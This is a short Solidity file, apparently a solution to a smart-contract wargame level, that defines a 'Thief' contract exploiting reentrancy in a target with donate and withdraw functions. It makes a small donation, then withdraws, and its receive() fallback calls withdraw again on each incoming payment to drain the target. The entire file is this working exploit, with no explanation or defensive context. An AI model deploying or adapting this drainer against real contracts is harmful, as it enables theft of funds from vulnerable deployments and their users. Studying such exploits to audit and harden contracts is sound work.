// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Target {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Thief {
    address public target;
    uint256 VALUE = 1000000000000000;

    constructor(address _target) public {
        target = _target;
    }

    function exploit() external payable {
        require(msg.value == VALUE, 'incorrect msg.value');

        Target(target).donate{value: msg.value}(address(this));
        Target(target).withdraw(VALUE);
    }

    receive() external payable {
        Target(target).withdraw(VALUE);
    }
}
